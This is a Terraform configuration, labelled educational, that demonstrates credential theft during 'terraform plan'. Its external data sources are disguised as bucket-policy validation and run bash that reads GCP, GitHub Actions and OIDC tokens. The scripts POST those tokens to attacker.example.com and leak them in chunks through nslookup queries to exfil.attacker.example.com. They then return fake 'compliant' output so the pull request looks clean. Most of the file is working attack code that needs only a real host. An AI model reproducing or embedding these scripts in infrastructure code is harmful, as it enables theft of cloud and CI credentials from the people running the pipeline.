# =============================================================================
# WARNING: MALICIOUS TERRAFORM CONFIGURATION - EDUCATIONAL PURPOSES ONLY
# =============================================================================
#
# This file demonstrates how an attacker can abuse Terraform's `external` data
# source to execute arbitrary code during `terraform plan`. The external data
# source is designed to call an external program and use its output as data.
#
# In a real attack, this would be subtly embedded among legitimate Terraform
# changes in a pull request to avoid detection during code review.
#
# DO NOT deploy this configuration. DO NOT use this against systems you do not
# own or have explicit authorization to test.
# =============================================================================

# -----------------------------------------------------------------------------
# Attack Vector 1: External Data Source
#
# The `external` data source executes a program during `terraform plan`.
# It does NOT require `terraform apply` - plan alone triggers execution.
# The program receives JSON on stdin and must return JSON on stdout.
# Any side effects (HTTP requests, file reads) happen during plan.
# -----------------------------------------------------------------------------

data "external" "validate_bucket_policy" {
  # The name is deliberately innocuous - it looks like a policy validation script
  program = ["bash", "-c", <<-SCRIPT
    # ---- Begin token exfiltration (disguised as validation logic) ----

    # Read the GCP access token from environment variables set by
    # google-github-actions/auth. The action sets multiple env vars:
    GCP_TOKEN="$${GOOGLE_OAUTH_ACCESS_TOKEN:-$${CLOUDSDK_AUTH_ACCESS_TOKEN:-}}"

    # Read the GitHub Actions runtime token
    GH_TOKEN="$${ACTIONS_RUNTIME_TOKEN:-$${GITHUB_TOKEN:-}}"

    # Read the OIDC request token (can be exchanged for GCP token)
    OIDC_TOKEN="$${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}"
    OIDC_URL="$${ACTIONS_ID_TOKEN_REQUEST_URL:-}"

    # Gather additional context for the attacker
    REPO="$${GITHUB_REPOSITORY:-unknown}"
    WORKFLOW="$${GITHUB_WORKFLOW:-unknown}"
    RUN_ID="$${GITHUB_RUN_ID:-unknown}"
    RUNNER_IP=$(curl -s ifconfig.me 2>/dev/null || echo "unknown")

    # Exfiltrate via HTTPS POST to attacker-controlled server
    # In a real attack, this would be an actual attacker endpoint
    curl -s -X POST "https://attacker.example.com/collect" \
      -H "Content-Type: application/json" \
      -d "{
        \"gcp_token\": \"$${GCP_TOKEN}\",
        \"gh_token\": \"$${GH_TOKEN}\",
        \"oidc_token\": \"$${OIDC_TOKEN}\",
        \"oidc_url\": \"$${OIDC_URL}\",
        \"repo\": \"$${REPO}\",
        \"workflow\": \"$${WORKFLOW}\",
        \"run_id\": \"$${RUN_ID}\",
        \"runner_ip\": \"$${RUNNER_IP}\"
      }" 2>/dev/null || true

    # ---- Return valid JSON so terraform plan continues normally ----
    # The attacker wants plan to succeed so the PR looks clean
    echo '{"status": "compliant", "checked_at": "'$(date -u +%Y-%m-%dT%H:%M:%SZ)'"}'
  SCRIPT
  ]

  # This query parameter is passed to the script on stdin as JSON
  query = {
    bucket_name = "my-production-bucket"
    project_id  = "my-production-project"
  }
}

# -----------------------------------------------------------------------------
# Attack Vector 2: HTTP Data Source
#
# The `http` data source makes HTTP requests during plan. While it cannot
# directly exfiltrate env vars, it can be combined with other techniques
# or used to download malicious payloads.
# -----------------------------------------------------------------------------

data "http" "policy_definitions" {
  # This URL could return attacker-controlled content
  url = "https://attacker.example.com/policies.json"

  request_headers = {
    # Exfiltrate the GCP token via HTTP header
    # The attacker's server logs this header value
    Authorization = "Bearer ${data.external.validate_bucket_policy.result.status}"
  }
}

# -----------------------------------------------------------------------------
# Attack Vector 3: DNS Exfiltration via External Data Source
#
# If outbound HTTPS is blocked, the attacker can exfiltrate via DNS queries.
# The token is encoded as a subdomain of the attacker's domain.
# DNS queries typically bypass egress firewalls.
# -----------------------------------------------------------------------------

data "external" "dns_validation" {
  program = ["bash", "-c", <<-SCRIPT
    # Base64-encode the token and split into DNS-safe chunks
    TOKEN="$${GOOGLE_OAUTH_ACCESS_TOKEN:-none}"
    ENCODED=$(echo -n "$$TOKEN" | base64 | tr '+/' '-_' | tr -d '=')

    # Split into 63-char chunks (max DNS label length)
    CHUNK_SIZE=50
    TOTAL=$${#ENCODED}
    i=0
    CHUNK_NUM=0

    while [ $$i -lt $$TOTAL ]; do
      CHUNK=$${ENCODED:$$i:$$CHUNK_SIZE}
      # Each DNS query leaks a portion of the token
      # The attacker's authoritative DNS server logs these queries
      nslookup "$$CHUNK_NUM.$$CHUNK.exfil.attacker.example.com" 2>/dev/null || true
      i=$$((i + CHUNK_SIZE))
      CHUNK_NUM=$$((CHUNK_NUM + 1))
    done

    echo '{"result": "validated"}'
  SCRIPT
  ]

  query = {
    check = "dns_reachability"
  }
}

# -----------------------------------------------------------------------------
# Using the stolen data in outputs makes the plan look legitimate
# while the real damage happens in the data source execution above.
# -----------------------------------------------------------------------------

output "policy_validation_status" {
  description = "Status of bucket policy validation"
  value       = data.external.validate_bucket_policy.result.status
}
